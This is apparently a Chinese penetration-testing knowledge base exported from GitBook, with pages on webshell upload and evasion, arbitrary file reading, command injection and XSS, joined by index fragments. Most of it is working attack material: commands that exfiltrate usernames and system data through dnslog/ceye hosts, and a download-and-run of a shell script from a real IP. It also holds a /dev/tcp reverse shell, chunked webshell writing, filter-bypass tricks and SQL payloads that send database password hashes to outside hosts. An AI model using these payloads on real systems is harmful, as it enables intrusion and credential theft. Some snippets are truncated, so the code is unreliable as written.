怎么判断呢？一般来讲，上传的时候，随便写点内容（不直接写webshell），后缀改为PHP/JSP/JSPX/ASPX/ASP等等，访问一下如果在，那么就可以认为是上传成功的；接下来再去上传webshell,如果访问不到，一般情况可以认为是杀毒给删除了。 免杀 通信加密 Webshell连接失败 访问webshell是没问题的，但是500错误之流，webshell连接工具也是没法连上的（虽然像冰蝎哥斯拉都是适配了大部分场景，但是有些国产化中间件还是存在适配问题，比如金蝶天燕） 后台上传需要带Cookie访问webshell 需要带上指定的Referer字段 Trick From：代码审计知识星球 修改压缩包二进制字节，让压缩包解压过程出错，但是出错前已解压部分即为webshell。（出错后捕获异常，程序中止，如果开发人员没有对已解压部分进行校验，那么已解压出的webshell就可以留在服务端中） https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 18:56:33 "},"01.渗透测试/02.Web安全/02.文件操作/文件包含.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件包含.html","title":"文件包含","keywords":"","body":"PHP，CTF Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 15:17:39 "},"01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html","title":"任意文件读取和下载","keywords":"","body":"漏洞原理 一些网站由于业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，攻击者就能够通过回溯符../或绝对路径跳转到任意目录查看或下载任意的文件；这可能是代码源文件，敏感配置文件等等，在特定的场景下，还可能造成SSRF漏洞。 常见场景 读取/下载图片、文件内容； 下载附件； 预览文档；导出文档；修改、保存文档等 漏洞利用 判断操作系统+测试权限 | | Win | Linux | | :----: | :----------------: | :---------: | | 低权限 | C:/windows/win.ini | /etc/hosts | | 高权限 | | /etc/shadow | 写🐎，读取web源码进行审计（获取Web路径） 读取中间件配置文件 # Linux /proc/self/environ # 当前进程的环境变量 /proc/self/cmdline # 启动当前进程时的命令行参数 /proc/self/cwd # 指向当前进程的工作目录 /proc/self/exe # 指向当前进程的可执行文件路径 # locate的索引数据库 /var/lib/mlocate/mlocate.db /var/lib/mlocate.db # 索引使用 locate -d db 要找的文件 利用其他服务 数据库服务 Web网站连接数据库的相关文件 /etc/redis.conf SSH服务 私钥 其他 # 敏感信息文件 shell历史命令 爆破桌面上的文件 .... /etc/apache2/apache2.conf /etc/apache2/httpd.conf /etc/apache2/ports.conf /etc/apache2/envvars /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-available/000-default-le-ssl.conf /etc/apache2/sites-available/default.conf /etc/apache2/sites-available/ssl.conf /etc/apache2/conf-available/security.conf /etc/apache2/conf-available/charset.conf /var/log/apache2/access.log /var/log/apache2/error.log /var/log/httpd/access_log /var/log/httpd/error_log /etc/nginx/nginx.conf /etc/nginx/conf.d/default.conf /etc/nginx/fastcgi.conf /etc/nginx/proxy.conf /etc/nginx/conf.d/ssl.conf /etc/nginx/sites-available/default.conf /usr/local/tomcat/conf/server.xml /usr/local/tomcat/conf/web.xml /usr/local/tomcat/conf/tomcat-users.xml 中间件 配置 文件目录 主配置文件 网站目录 日志目录 nginx /etc/nginx/ nginx.conf /usr/share/nginx/html/ /var/log/nginx/ apache apache2.conf /var/www/html/ /var/log/apache2/ tomcat /usr/local/tomcat/conf 如下图 /usr/local/tomcat/webapps /usr/local/tomcat/log java站点 /WEB-INF/web.xml /WEB-INF/classes/applicationContext.xml /WEB-INF/classes/xxx/xxx/xxx.class core.jar 如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索Base64.decode直接找key，进而getshell Linux /etc 系统配置文件目录 /etc/passwd 记录用户信息 [root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd root:x:0:0:root:/root:/bin/bash ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin .... 允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin 格式解析 以:作为分隔符 登录名:加密的口令:UID:GID:用户信息:用户目录:用户登陆后使用的shell 为什么有些登录名是服务进程名？ Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户。 这些账户叫作系统账户，是系统上运行的各种服务进程访问资源用的特殊账户。 比如上述的ftp，tcpdump。 为什么要这样做？ 在安全成为一个大问题之前，这些服务经常会用root账户登录。遗憾的是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。 为什么密码都是X 鉴于很多程序都需要访问etc/passwd文件获取用户信息，这就成了一个安全隐患。 绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置 在/etc/shadow）。只有特定的程序（比如登录程序）才能访问这个文件 /etc/shadow /etc/shadow文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问/etc/shadow 文件，这让它比起/etc/passwd安全许多。 /sys/class/net/eth0/address mac地址 内网探测 文件内容解释https://blog.csdn.net/weichanghu_/article/details/80073959 /etc/hosts：记录本机的或其他主机的ip及其对应主机名 /proc/net/arp：记录主机ip和mac？（arp协议） /proc/net/tcp /proc/net/udp /proc/net/dev /proc/net/fib_trie /proc/net/ 作用：该目录下包含了与网络相关的信息，常见的文件有： /proc/net/dev：显示网络接口的统计信息，如接收和发送的字节数。 /proc/net/tcp：显示TCP连接的状态。 /proc/net/udp：显示UDP连接的状态。 /proc/net/route：显示路由表信息。 /proc/mounts 作用：显示当前系统挂载的文件系统的信息，包括挂载点、文件系统类型和挂载选项等。 /proc/hostname 作用：显示系统的主机名。 命令历史操作 Linux| 用户目录下三个bash文件的作用(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHe的博客-CSDN博客_bash_history /home/用户名/.bash_history： 保存了当前用户使用过的历史命令 命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。 这里要注意的是，bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。 root用户可以通过history命令查看 /proc目录 /proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 /proc/self/cmdline # 启动当前进程时的命令行参数 /proc/self/cwd # 指向当前进程的工作目录 /proc/self/exe # 指向当前进程的可执行文件路径 /proc/self/environ # 当前进程的环境变量 /proc/self/mounts # 描述了系统中所有挂载的文件系统 /proc/version # 显示系统内核版本信息 # 爆破 /proc/pid/fd /proc/?/fd # 使用通配符匹配 注意点 在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。 /proc/self在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取/proc/self/cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取/proc/self/cmdline。 漏洞修复 在配置文件中限制访问的文件目录 检查用户输入，过滤或转义含有../、..\\、%00，..，./，#等跳转目录或字符终止符、截断字符的输入 严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等 白名单限定访问文件的目录、路径、名称 白名单限定访问文件的后缀如jpg、gif、png、rar、zip、pdf、doc、xls、ppt等 OSS存储 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 15:09:58 "},"01.渗透测试/02.Web安全/02.文件操作/文件预览.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件预览.html","title":"文件预览","keywords":"","body":"PDF https://xz.aliyun.com/t/10025?time__1311=Cqjx2DRiD%3DMDlxGgOKGOiDC8GCDcimPOioD https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf/4 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 15:20:23 "},"01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html":{"url":"01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html","title":"01.漏洞了解","keywords":"","body":"漏洞原理 命令注入（Command Injection）漏洞是指攻击者通过注入恶意命令来执行非预期的操作；简单来说就是没有对用户输入的内容充分的验证或过滤，而直接带入到命令执行函数中当成系统命令被执行。 漏洞危害 执行任意系统命令，可能导致系统被完全控制。 敏感信息泄露，如密码、数据库内容等。 对系统进行拒绝服务（DoS）攻击。 执行恶意代码，如安装后门、植入恶意软件等。 常见场景 管理界面的配置主机名/IP/掩码/网关、查看系统信息等功能处 关闭、重启等功能处 ping、nslookup等验证主机等功能处 提供发送邮件、转换图片等功能处 私钥生成 通过数据库执行 POC # Win || curl %USERNAME%.8f208c4a.ipv6.1433.eu.org # Linux || curl `whoami`.8f208c4a.ipv6.1433.eu.org 漏洞修复 输入验证和过滤：对于从用户或外部源接收的所有输入数据，进行严格的验证和过滤。确保只允许预期的输入字符和格式，并拒绝潜在的恶意代码。 权限限制：确保应用程序在执行命令时使用最低特权。不要在命令执行中使用超级用户权限或管理员权限，以降低攻击者可能获得的权限。 沙箱环境：在可能的情况下，将应用程序或相关组件运行在沙箱环境中，以限制其对系统的访问权限。这可以帮助隔离恶意代码的影响，并提供额外的安全层。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 22:33:09 "},"01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html":{"url":"01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html","title":"02.漏洞利用","keywords":"","body":"命令结果无回显 结果重定向 将文件移动到可访问目录（网站目录，静态 文件目录） 外带 HTTP协议 ```shell Linux curl http/cmd # Windows for /F %X in ('whoami') do start http://fgtb.eyes.sh/%X # 用whoami时因为有/，所以不能用dnslog，只能用weblog for /F %X in ('cd') do start http://fgtb.eyes.sh/%X cmd /v /c \"whoami > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR= DNS协议 各种环境DNS外带回显命令 | CN-SEC 中文网 https://github.com/A0WaQ4/HexDnsEchoT 不出网写Webshell 写webshell # Linux echo '' > 1.php echo \"\" > 1.php # 双引号包裹需要转义 # Win echo ^ > 1.php # 使用^来转义 通过静态文件定位web目录并自动写入文件 # Linux find / -name \"1.txt\" -execdir bash -c 'echo \"\" > phpinfo.php' \\; # Win for /f %i in ('dir /s /b note.txt') do (echo %i>path.txt)&(ipconfig > ipconfig.txt)&(systeminfo >systeminfo.txt)&(tasklist > tasklist.txt) for /f %i in ('dir /s /b note.txt') do (echo ^ > phpinfo.php) # 不行 powershell -command \"Get-ChildItem -Path './' -Recurse -Filter 'note.txt' | ForEach-Object { New-Item -Path $_.DirectoryName -Name 'phpinfo.php' -ItemType 'file' -Value '' }\" # 当文件存在时写入会失败，需要修改文件名 文件写入分块传输 Linux echo -e -n \\\" /var/www/html/1.txt echo -e -n \\\"eval\\\" > /var/www/html/2.txt echo -e -n '($_POST[\\\"pass' > /var/www/html/3.txt echo -e -n '\\\"])' > /var/www/html/4.txt echo -e -n \\\" ?>\\\" > /var/www/html/5.txt cat /var/www/html/1.txt /var/www/html/2.txt /var/www/html/3.txt /var/www/html/4.txt /var/www/html/5.txt> /var/www/html/xxx.php python分块传输 import requests import base64 def encode_file_to_base64(file_path, output_path): \"\"\"将文件内容转化为Base64字符串并保存到新文件中。\"\"\" with open(file_path, 'rb') as file: file_content = file.read() base64_encoded = base64.b64encode(file_content).decode('utf-8') with open(output_path, 'w', encoding='utf-8') as output_file: output_file.write(base64_encoded) def read_text_from_file(file_path): \"\"\"从文件中读取Base64字符串内容。\"\"\" with open(file_path, 'r', encoding='utf-8') as file: text = file.read() return text def split_text(text, chunk_size=100): \"\"\"将文本按每chunk_size个字符分割。\"\"\" return [text[i:i + chunk_size] for i in range(0, len(text), chunk_size)] def send_post_requests(url, text_chunks): \"\"\"遍历每个分割后的文本并发送POST请求。\"\"\" responses = [] for chunk in text_chunks: response = requests.post(url, data={'body': chunk}) responses.append(response) return responses # 示例用法 original_file_path = \"path/to/your/file\" # 要编码的文件路径 base64_file_path = \"path/to/your/base64_output.txt\" # 存储Base64编码的文件路径 url = \"http://your_api_endpoint_here\" # 1. 将文件内容转换为Base64并保存到新文件中 encode_file_to_base64(original_file_path, base64_file_path) # 2. 从Base64文件中读取内容 base64_text = read_text_from_file(base64_file_path) # 3. 分割Base64字符串 text_chunks = split_text(base64_text, chunk_size=100) # 4. 发送POST请求 responses = send_post_requests(url, text_chunks) # 输出每个响应状态码 for i, response in enumerate(responses): print(f\"请求 {i+1} 状态码: {response.status_code}\") base64解码 base64 -d /tmp/tmp.txt > /tmp/payload 反弹shell https://forum.ywhack.com/shell.php 远程文件下载 远程文件下载 远程下载sh并执行 wget http://104.243.25.78:8888/1.sh chmod 777 1.sh || chmod +x 1.sh bash 1.sh win bitsadmin /transfer n '下载地址' '保存地址' powershell (new-object System.Net.WebClient).DownloadFile('下载地址','保存地址') 下载文件: certutil -urlcache -split -f '下载地址' '保存地址' 删除缓存: certutil -urlcache -split -f '下载地址' delete # 绕过手段之双写certutil certutil & certutil ..... # 绕过手段之分块传输 CertUtil -encode fscan.exe fscan_base64.txt # 编码 cmd=powershell -c \"'§§' | Out-File C:\\fscan_base64.txt -Append\" #PowerShell追加写入 certutil -decode fscan_base64.txt fscan.exe # certutil还原文件 Windows&Linux文件传输方式总结 - yokan - 博客园 (cnblogs.com) https://lolbas-project.github.io/ 类似于gtfobins Bypass Linux 多条命令执行 连接符 功能 \\ 管道，前一个命令的输出作为后一个命令的输入 ； 依次执行命令 \\ \\ 如果前一条命令执行不成功则执行下一条命令 & 即使前一条命令执行不成功也会执行下一条命令 && 如果前一条命令执行成功则执行下一条命令 %0a / %0d%0a 换行执行命令 `` 内敛执行 $() 内敛执行 . Linux 中，.也叫period，它的作用和source一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 . filename的意思就是用 bash 执行 filename 文件中的命令。 编码绕过 base64 echo 'base64(payload)' | base64 -d | bash 进制绕过 shell解析八进制，ls → $'\\154'$'\\163' khaz@DESKTOP-JCNAFF7:~$ $'\\154'$'\\163' 1 jdk-8u333-linux-x64.tar.gz:Zone.Identifier result.txt ysoserial.jar:Zone.Identifier jdk-8u333-linux-x64.tar.gz jdk8 # php传参时的格式 $(printf \"\\154\\163\") $(echo \"\\154\\163\") 进制转换 ┌──(khaz㉿kali)-[~/桌面] └─$ echo $((2#111)) 7 php绕过 php花样就多了😋 php -r 'system(chr(108).chr(115))' 绕过关键字过滤 插入\\ cat = ca\\t = c\\at = \\cat 插入空字符 ls = l''s = l\"\"s = l's' = l\"s\" （只要插入成对的单双引号就可以） = l$1s = l${asdfa}s = l``s = l$(``)s = l$('')s = l$(\"\")s $1~$9为脚本参数 ${xx}代表变量值,只要xx没有定义即可 内敛执行空命令 变量拼接 a=c;b=at;$a$b file 如果；被过滤，可以用%0a或者&&（需要url编码）代替 其他命令代替 文件名用通配符 输出重定向符绕过 重定向符写入文件的本质是将标准输入输出到文件中 echo 3c3f70687020406576616c28245f504f53545b277479736563275d293b3f3e|xxd -ps -r|tee shell.php xxd：用于将十六进制编码的数据转换回原始的二进制数据 -ps：指定输出格式为纯粹的十六进制字符串。 -r：表示进行反向操作，即将十六进制字符串转换为二进制数据。 tee：同时将读取的标准输入内容输出到标准输出和指定的文件中。 顺着这个思路 command | dd of=file.txt command | cp /dev/stdin file.txt 空格绕过 ${IFS} $IFS+空字符 重定向符 {cat,flag.php} url参数编码，空格%20，制表符%09 目录分隔符/绕过 多条命令执行，先cd到目的目录，再执行cat等命令 cd ..;cd ..;cd ..;cat flag 如果；被过滤，可以用%0a或者&&（需要url编码）代替 截取环境变量 env或者printenv：打印环境变量 khaz@DESKTOP-JCNAFF7:~$ echo ${PWD:0:1} / 内敛执行绕过 cat `ls` cat $(ls) >>读取当前目录的所有文件 将ls的输出作为cat的输入进行执行。 长度限制绕过 知识点 ls输出的结果是按照字典排序的 \\放在指令的最末端，表示指令连接下一行。 khaz@DESKTOP-JCNAFF7:~$ cat \\ > 1 da ls -t > a将文件名（命令）按时间重定向到脚本文件a中，sh a执行脚本a。 注：将执行的命令反序生成。\\\\是为了转义，让文件名带上\\ 单独一个*会将目录下的文件名按照字典排序拼接成命令执行，第一个文件名为命令，其他为该命令的参数 echo hello 在这个基础上*o也可以，就是取出满足正则*o的文件名拼接成命令执行。 [UUCTF 2022 新生赛]ezrce 给出了一个命令执行接口，测试之后发现长度限制为6,正常思路 >a echo 1 然后尝试访问/tmp/a，服务器没有报错，说明>a其实是执行成功了的。 解法1 >cp * /* . 第一条命令创建一个文件名为cp的文件 第二条命令执行cp /* .，将根目录下的文件复制到当前目录下，然后访问/tmp/flag即可 解法2 >nl * /*>a 第一条命令创建一个文件名为nl的文件 第二条命令执行nl /*>a，读取根目录下所有文件的内容重定向到a中，然后访问/tmp/a即可 解法3 脚本直接写🐎 无数字绕过 安洵杯2020[Web-Bash-Vino0o0o] 只能用${#}\\\\(这几个字符构造命令。 知识点 https://www.wolai.com/ctfhub/7oqQw5FrzCKj2us3ERp6Vg 解析八进制 bash 可以用 $'\\ooo' 的形式來表達任意字元（ooo 是字元轉 ascii 的八進制） ┌──(khaz㉿kali)-[~/桌面] └─$ echo $'\\154'$'\\163' ls 进制转换 $((x进制#数字))：将x进制的数字转为10进制 ┌──(khaz㉿kali)-[~/桌面] └─$ echo $((2#111)) 7 获取字符串长度 ┌──(khaz㉿kali)-[~/桌面] └─$ string=\"abcd\" echo ${#string} 4 $# 传递给脚本参数的个数 $$ $$ 代表的是目前的 pid ┌──(khaz㉿kali)-[~/桌面] └─$ echo $$ 21226 ┌──(khaz㉿kali)-[~/桌面] └─$ ps PID TTY TIME CMD 21226 pts/0 00:00:05 zsh 41100 pts/0 00:00:00 ps ┌──(khaz㉿kali)-[~/桌面] └─$ echo $(($# $0 保存脚本名 ┌──(khaz㉿kali)-[~/桌面] └─$ echo $0 bash 的用途是將任意字串交由前面的指令執行 思路：因为shell能够解析解析八进制，所以构造出0~7数字，将命令转换为八进制。 exp import requests n = dict() n[0] = '0'#0 n[1] = '${##}'#1 n[2] = '$((${##}& /dev/tcp/120.77.73.212/2333 0>&1')) #盲注 #a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@' # for i in range(1,50): # for j in a: # cmd=f'cat /flag|grep ^{f+j}&&sleep 3' # url = \"http://ip/\" # if get_flag(url,build(cmd)): # break # f = f+j # print(f) Win 多条命令执行 & 用于连接多个命令，按顺序执行 && 用于连接多个命令，只有前一个命令成功执行后才执行下一个命令 \\ 用于将一个命令的输出作为另一个命令的输入 \\ \\ 用于连接多个命令，只要前一个命令执行失败，就执行下一个命令 绕过特殊内容 一些情况下，会禁止出现一些指定内容，如CTF时的flag字段等，如果不能用通配符，那么可以尝试使用编码方式来绕过 powershell -command \"$decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y2F0IC9mbGFnCg==')); Invoke-Expression $decodedCommand\" 也可以使用防转义的方式来绕过 type test.t^x^t 还可以使用拼接的方式绕过 type t\"es\"t.tx\"\"t 还可以使用赋值变量的方式来绕过 set a=type&&set b=test.txt&&%a% %b% 如果禁止了%\\w%，那么还可以用切割的方式来绕过 set a=type&&set b=test.txt&&%a:~0% %b% 绕过空格 一些情况下，会禁止在命令中使用空格，那么可以用如下几种方式来绕过 type.\\test.txt type,test.txt Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 22:23:20 "},"01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html":{"url":"01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html","title":"03.Dnslog","keywords":"","body":"Windows ping %USERNAME%.xxxxx.ceye.io cmd /v /c \"hostname > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR= test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.xxxxx.ceye.io';$j += 1; nslookup $fin } Linux ping `whoami`.xxxxx.ceye.io curl `id -un`.xxx.dnslog.cn curl `pwd|od -A n -t x1|sed 's/ //g'`.xxx.dnslog.cn curl $(find /xxx/xx/xx -type d -writable |od -A n -t x1|sed 's/ //g'|sed -r 's/$/.mp3smh.dnslog.cn/g') # 查找可写目录 var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.xxxxx.ceye.io; done var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,\"&\\n\")}1'); do var=$((var+1)) && nslookup $var.$i.xxxxx.ceye.io; done mssql DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') +'.ip.port..ceye.io'; EXEC('master..xp_dirtree \"\\\\'+@host+'\\foobar$\"'); mysql SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port..ceye.io\\\\abc')); Oracle SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port..ceye.io'); SELECT UTL_HTTP.REQUEST('http://ip.port..ceye.io/oracle') FROM DUAL; SELECT HTTPURITYPE('http://ip.port..ceye.io/oracle').GETCLOB() FROM DUAL; SELECT DBMS_LDAP.INIT(('oracle.ip.port..ceye.io',80) FROM DUAL; SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port..ceye.io',80) FROM DUAL; PostgreSQL DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres'); exec_cmd := E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.psql.ip.port..ceye.io\\\\\\\\foobar.txt\\''; EXECUTE exec_cmd; END; $ LANGUAGE plpgsql SECURITY DEFINER; SELECT temp_function(); Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 15:35:34 "},"01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html":{"url":"01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html","title":"01.前置知识","keywords":"","body":"浏览器什么时候会将响应内容当成 HTML 文档来解析 当响应的 Content-Type为以下时，浏览器就会将响应内容当成 HTML 文档来解析，这也是为什么纯API接口网站不存在XSS漏洞的原因（Content-Type为application/json） text/html application/xhtml+xml application/xml text/xml image/svg+xml 如何执行javascript script标签 alert(1) 非script标签 事件触发 HTML DOM 事件对象 | 菜鸟教程 javascript: 伪协议 //IE7以下 script标签的src属性，引入外来js文件 请求网页解码流程 HTML 编码/解码 当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。 但是在HTML中有些字符是和关键词冲突的，比如 、>、&，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。 字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&符号开头，后面跟着一个预定义的实体的名称，或用&#开头+实体编号+分号来表示。 常见的HTML字符实体有： 显示结果 描述 实体名称 实体编号 空格 小于号 > 大于号 > > & 和号 & & \" 引号 \" \" ' 撇号 '(IE不支持) ' 但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 符号（后面没有跟 /符号）就会进入 标签开始状态(Tag open state) ，然后转变到 标签名状态(Tag name state) 、 前属性名状态(before attribute name state) ......最后进入 数据状态(Data state) 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。 所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。 URL 解码 URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。 在服务端接收到请求时，会自动对请求进行一次URL解码。 JavaScript 解码（只支持Unicode） 当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 、 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。 比如 test，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符\\u0031，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 test。 下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。 test 首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：https://www.baidu.com，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。 整个解析顺序为3个环节：HTML解码 —>URL解码 —>JS解码 我们可以对XSS攻击向量做这三种编码都可以成功弹框。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:28:37 "},"01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html":{"url":"01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html","title":"02.漏洞了解","keywords":"","body":"漏洞原理 跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞允许攻击者将恶意代码注入到前端网页上，其他用户在浏览网页时就会执行恶意代码而受到影响。 本质是客户端漏洞，当浏览器将响应内容当成 HTML 文档来解析时触发恶意js代码完成攻击 漏洞危害 实际上就是JS代码执行，所以js能做的就能做 窃取用户的会话令牌或Cookie，并以用户的身份进行非法操作 未授权操作，通过JS发起敏感操作请求 按键记录和钓鱼 xss蠕虫传播，借助网站进行传播，使网站的使用用户受到攻击。 劫持用户会话，从而知悉任意操作，比如弹窗跳转、篡改页面、网页挂马。 漏洞分类 反射型 用户输入什么网站返回什么，漏洞成型点在服务器端代码解析引擎 if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) { // 直接将用户输入拼接到html中 $html .= 'Hello ' . $_GET[ 'name' ] . ''; } 常见场景：将用户输入进行回显的地方，攻击者通常要将构造好的url发送给受害者，受害者点击之后才会触发。 比如某站点搜索功能处存在反射xss，攻击者构造 https://test.com/search.php?key= 当用户点击该链接就会发生弹窗 存储型 用户输入的数据会先存储到数据库中，只要查询到数据库中的脏数据，这些数据回显到页面就会触发XSS，漏洞成型点在数据库 if( isset( $_POST[ 'btnSign' ] ) ) { // 获取用户输入 $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // 防御sql注入（也不全，$name变量没有过滤） $message = mysqli_real_escape_string( $message ); // 没有考虑到对 XSS 进行过滤,将xss数据存入数据库中 $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; // 查询，拼接，触发xss xxxx； } 常见场景：评论，订单，个人信息修改（可以参考sql中的二次注入） DOM型 与服务器无交互，漏洞成型点在javascript文件解析用户输入时，触发点在客户端渲染DOM时。 # lang 变量通过 document.location.href（当前页面的 URL）来获取 var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); # 并且没有任何过滤就直接 URL 解码后输出在了 option 标签中 document.write(\"\" + $decodeURI(lang) + \"\"); 常见场景：需要审计javascript代码😪 常见场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性、自定义头像链接，上传文件名 POC 123 \" nmask 漏洞修复 CSP https://xz.aliyun.com/t/12370#toc-25 CSP指的是Content Security Policy，即内容安全策略（白名单）。它是一种安全机制，用于保护网站免受跨站脚本攻击（XSS攻击）、数据盗取等Web攻击的影响。 CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置。 通过CSP，网站管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被恶意脚本攻击的风险。 输出编码 黑名单 更多参考https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/02.XSS/#%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 15:40:38 